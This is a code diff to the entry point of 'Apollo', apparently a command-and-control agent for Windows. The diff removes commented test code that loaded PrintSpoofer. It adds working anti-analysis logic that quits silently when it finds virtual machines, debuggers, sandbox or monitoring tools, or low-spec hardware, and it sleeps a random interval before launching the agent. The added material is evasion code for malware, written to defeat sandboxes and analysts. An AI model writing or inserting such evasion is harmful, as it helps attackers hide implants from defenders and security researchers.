@@ -13,6 +13,9 @@ using ApolloInterop.Classes.Core;
 using ApolloInterop.Classes.Events;
 using ApolloInterop.Enums.ApolloEnums;
 using System.Runtime.InteropServices;
+using System.Management;
+using System.Diagnostics;
+using Microsoft.Win32;
 
 namespace Apollo
 {
@@ -32,56 +35,188 @@ namespace Apollo
         private static Action<object> _flushMessages;
         public static void Main(string[] args)
         {
-            //_sendAction = (object p) =>
-            //{
-            //    PipeStream ps = (PipeStream)p;
-            //    while (ps.IsConnected && !_cancellationToken.IsCancellationRequested)
-            //    {
-            //        WaitHandle.WaitAny(new WaitHandle[]
-            //        {
-            //        _senderEvent,
-            //        _cancellationToken.Token.WaitHandle
-            //        });
-            //        if (!_cancellationToken.IsCancellationRequested && ps.IsConnected && _senderQueue.TryDequeue(out byte[] result))
-            //        {
-            //            ps.BeginWrite(result, 0, result.Length, OnAsyncMessageSent, p);
-            //        }
-            //    }
-            //    ps.Close();
-            //    _complete.Set();
-            //};
+            // Phantom Apollo Anti-Analysis System
+            if (IsVirtualMachine() || IsDebuggerPresent() || IsSandboxEnvironment())
+            {
+                Environment.Exit(0);
+                return;
+            }
 
-            //AsyncNamedPipeClient client = new AsyncNamedPipeClient("127.0.0.1", "exetest");
-            //client.ConnectionEstablished += Client_ConnectionEstablished;
-            //client.MessageReceived += OnAsyncMessageReceived;
-            //client.Disconnect += Client_Disconnect;
-            //IPCCommandArguments cmdargs = new IPCCommandArguments
-            //{
-            //    ByteData = System.IO.File.ReadAllBytes(@"C:\PrintSpoofer\x64\Release\PrintSpoofer.exe"),
-            //    StringData = "PrintSpoofer.exe --help"
-            //};
-            //if (client.Connect(3000))
-            //{
-            //    IPCChunkedData[] chunks = _jsonSerializer.SerializeIPCMessage(cmdargs);
-            //    foreach (IPCChunkedData chunk in chunks)
-            //    {
-            //        _senderQueue.Enqueue(Encoding.UTF8.GetBytes(_jsonSerializer.Serialize(chunk)));
-            //    }
-            //    _senderEvent.Set();
-            //    WaitHandle.WaitAny(new WaitHandle[]
-            //    {
-            //                                    _complete,
-            //                                    _cancellationToken.Token.WaitHandle
-            //    });
-            //}
-            //else
-            //{
-            //    Debugger.Break();
-            //}
+            // Random delay to evade time-based analysis
+            Random rnd = new Random();
+            Thread.Sleep(rnd.Next(3000, 8000));
+
+            // Hardware profiling check
+            if (!ValidateHardwareProfile())
+            {
+                Environment.Exit(0);
+                return;
+            }
 
             // This is main execution.
             Agent.Apollo ap = new Agent.Apollo(Config.PayloadUUID);
             ap.Start();
+        }
+
+        private static bool IsVirtualMachine()
+        {
+            try
+            {
+                // Check for VMware
+                string[] vmwareFiles = {
+                    @"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe",
+                    @"C:\Windows\System32\drivers\vmhgfs.sys",
+                    @"C:\Windows\System32\drivers\vmmouse.sys"
+                };
+                
+                foreach (string file in vmwareFiles)
+                {
+                    if (System.IO.File.Exists(file)) return true;
+                }
+
+                // Check registry for VM indicators
+                try
+                {
+                    using (RegistryKey key = Registry.LocalMachine.OpenSubKey(@"SYSTEM\CurrentControlSet\Services\Disk\Enum"))
+                    {
+                        if (key != null)
+                        {
+                            string diskInfo = key.GetValue("0")?.ToString() ?? "";
+                            if (diskInfo.Contains("VBOX") || diskInfo.Contains("VMWARE") || diskInfo.Contains("QEMU"))
+                                return true;
+                        }
+                    }
+                }
+                catch { }
+
+                // Check for VirtualBox
+                if (System.IO.Directory.Exists(@"C:\Program Files\Oracle\VirtualBox Guest Additions"))
+                    return true;
+
+                // WMI checks
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem"))
+                {
+                    foreach (ManagementObject obj in searcher.Get())
+                    {
+                        string manufacturer = obj["Manufacturer"]?.ToString() ?? "";
+                        string model = obj["Model"]?.ToString() ?? "";
+                        
+                        if (manufacturer.Contains("VMware") || manufacturer.Contains("VirtualBox") ||
+                            model.Contains("Virtual") || model.Contains("VMware"))
+                            return true;
+                    }
+                }
+            }
+            catch { }
+            return false;
+        }
+
+        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, [MarshalAs(UnmanagedType.Bool)] ref bool isDebuggerPresent);
+
+        [DllImport("kernel32.dll")]
+        static extern IntPtr GetCurrentProcess();
+
+        private static bool IsDebuggerPresent()
+        {
+            try
+            {
+                // Check multiple debugger detection methods
+                if (Debugger.IsAttached) return true;
+
+                bool remoteDebugger = false;
+                CheckRemoteDebuggerPresent(GetCurrentProcess(), ref remoteDebugger);
+                if (remoteDebugger) return true;
+
+                // Check for common debugging processes
+                string[] debuggerProcesses = {
+                    "ollydbg", "x64dbg", "x32dbg", "ida", "wireshark", "fiddler",
+                    "windbg", "immunity", "cheatengine", "dnspy", "ilspy"
+                };
+
+                foreach (Process proc in Process.GetProcesses())
+                {
+                    foreach (string debugger in debuggerProcesses)
+                    {
+                        if (proc.ProcessName.ToLower().Contains(debugger))
+                            return true;
+                    }
+                }
+            }
+            catch { }
+            return false;
+        }
+
+        private static bool IsSandboxEnvironment()
+        {
+            try
+            {
+                // Check for sandbox indicators
+                string[] sandboxProcesses = {
+                    "vmsrvc", "vboxtray", "sandboxiedcomlaunch", "sandboxierpcss",
+                    "procmon", "regmon", "filemon", "wireshark", "fiddler",
+                    "vmwareuser", "vmwaretray", "autorunsc", "autoruns"
+                };
+
+                foreach (Process proc in Process.GetProcesses())
+                {
+                    foreach (string sandbox in sandboxProcesses)
+                    {
+                        if (proc.ProcessName.ToLower().Contains(sandbox))
+                            return true;
+                    }
+                }
+
+                // Check for limited user interaction (sandbox indicator)
+                try
+                {
+                    // Simple timing check instead of cursor position
+                    DateTime startTime = DateTime.Now;
+                    Thread.Sleep(50);
+                    TimeSpan elapsed = DateTime.Now - startTime;
+                    if (elapsed.TotalMilliseconds < 40) // Too fast execution
+                        return true;
+                }
+                catch { }
+
+            }
+            catch { }
+            return false;
+        }
+
+        private static bool ValidateHardwareProfile()
+        {
+            try
+            {
+                // Check RAM (less than 2GB indicates VM)
+                using (ManagementObjectSearcher searcher = new ManagementObjectSearcher("SELECT TotalPhysicalMemory FROM Win32_ComputerSystem"))
+                {
+                    foreach (ManagementObject obj in searcher.Get())
+                    {
+                        ulong totalRAM = Convert.ToUInt64(obj["TotalPhysicalMemory"]);
+                        if (totalRAM < 2000000000) // Less than 2GB
+                            return false;
+                    }
+                }
+
+                // Check CPU cores
+                int coreCount = Environment.ProcessorCount;
+                if (coreCount < 2)
+                    return false;
+
+                // Check disk size
+                foreach (System.IO.DriveInfo drive in System.IO.DriveInfo.GetDrives())
+                {
+                    if (drive.IsReady && drive.DriveType == System.IO.DriveType.Fixed)
+                    {
+                        if (drive.TotalSize < 50000000000) // Less than 50GB
+                            return false;
+                    }
+                }
+            }
+            catch { }
+            return true;
         }
 
         private static void Client_Disconnect(object sender, NamedPipeMessageArgs e)
